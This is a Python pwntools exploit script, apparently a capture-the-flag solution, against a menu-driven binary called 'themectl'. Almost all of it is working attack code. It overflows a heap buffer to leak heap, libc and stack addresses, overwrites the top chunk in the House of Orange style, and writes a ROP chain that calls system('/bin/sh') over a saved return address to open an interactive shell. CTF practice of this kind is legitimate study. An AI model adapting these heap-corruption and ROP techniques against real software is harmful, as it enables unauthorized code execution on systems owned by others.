#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './themectl'
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# breakrva 0x1d65
breakrva 0x1db8
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# pwndbg> checksec
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

# structure:
#   theme {
#       long count;
#       char *idea[count];
#   }
# 
#   user {
#       char *name;
#       char *password;
#       theme *theme;
#   }

def register(name, password, themecnt):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'name:', name)
    io.sendlineafter(b'password:', password)
    io.sendlineafter(b'like?', str(themecnt).encode())

def login(name, password):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'name:', name)
    io.sendlineafter(b'password:', password)

def return_aliased_exit():
    io.sendlineafter(b'>', b'3')

def edit(idx, theme):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'edit?', str(idx).encode())
    io.sendlineafter(b'idea:', theme)

def view(idx):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'view?', str(idx).encode())

def logout():
    io.sendlineafter(b'>', b'4')

def exploit():
    global io
    io = initialize()

    heap = 0x0
    stack = 0x0

    # ===================
    # LEAK HEAP ADDR
    # ===================
    register(b'aaaa', b'bbbb', 1)
    edit(0, b'')
    logout()

    register(b'cccc', b'dddd', 2)
    logout()

    login(b'aaaa', b'bbbb')
    edit(0, b'A'*(7*8-1) + b'B')
    logout()
    
    login(b'cccc', b'dddd')
    edit(0, b'')
    logout()

    login(b'aaaa', b'bbbb')
    view(0)
    io.recvuntil(b'AB')
    heap = u64(io.recvline().strip().ljust(8, b'\x00')) & 0xfffffffffffff000
    edit(0, b'\x00'*(5*8) + p64(0x21) + p64(0x2) + p64(heap+0x4a0)) # restore heap state
    logout()

    # ======================================
    # LEAK LIBC -> HOUSE OF ORANGE WAY
    # https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/house_of_orange/
    # ======================================
    login(b'cccc', b'dddd')
    edit(0, b'\x00' * 0x28 + p64(0xb41)) # overwrite top chunk
    logout()

    register(b'eeee', b'ffff', 360)
    logout()

    login(b'aaaa', b'bbbb')
    edit(0, b'A'*(7*8) + p64(heap+0x530))
    logout()

    login(b'cccc', b'dddd')
    view(0)
    libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x1d2cc0
    logout()

    # ======================================
    # LEAK STACK
    # ======================================
    login(b'aaaa', b'bbbb')
    edit(0, b'A'*(7*8) + p64(libc.sym['environ']))
    logout()

    login(b'cccc', b'dddd')
    view(0)
    stack = u64(io.recvline().strip().ljust(8, b'\x00'))
    rip = stack - 0x120
    logout()

    # ======================================
    # ROP
    # ======================================
    rop = ROP(libc)
    payload = flat([
        rop.find_gadget(['pop rdi', 'ret']).address,
        next(libc.search(b'/bin/sh\x00')),
        rop.find_gadget(['ret']).address,
        libc.sym['system']
    ])

    login(b'aaaa', b'bbbb')
    edit(0, b'A'*(7*8) + p64(rip))
    logout()

    login(b'cccc', b'dddd')
    edit(0, payload)
    logout()

    return_aliased_exit()

    log.success('heap base: %#x', heap)
    log.success('libc base: %#x', libc.address)
    log.success('rip: %#x', rip)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
